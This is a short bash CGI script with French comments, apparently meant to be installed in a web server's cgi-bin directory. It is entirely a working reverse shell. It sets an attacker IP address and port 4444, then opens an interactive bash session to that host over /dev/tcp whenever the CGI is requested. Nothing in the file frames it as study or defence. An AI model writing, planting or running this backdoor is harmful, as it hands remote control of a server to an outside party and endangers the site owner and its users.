#!/bin/bash
# /var/www/cgi-bin/revshell.cgi
# Reverse shell bash CGI

# IP et port de l'attaquant (à modifier)
ATTACKER_IP="154.12.234.206"
ATTACKER_PORT=4444

# Lancement du reverse shell
/bin/bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
